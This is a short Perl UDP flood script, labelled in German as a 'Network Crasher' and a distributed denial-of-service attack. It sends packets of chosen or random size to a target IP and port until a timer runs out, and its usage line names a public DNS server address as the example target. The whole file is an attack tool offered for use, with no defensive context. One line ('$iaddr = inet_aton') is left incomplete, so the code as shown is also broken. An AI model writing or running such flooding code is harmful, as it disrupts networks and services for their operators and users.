#!/usr/bin/perl

#Args
# 1 - IP
# 2 - Port
# 3 - Size of the packet to send
# 4 - Time in secondes
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "Erstellt ]Creep1ng/Dr3ams] André\n";
  print "C1D3 Network Crasher: perl DDoS.pl 8.8.8.8 80 2048 500\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton
print "Distributed Denial Of Service Attack wird ausgeführt\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~Zum Abbrechen drücke \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Packete|\t\t |Zeit|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "Zum Abbrechen drücke 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
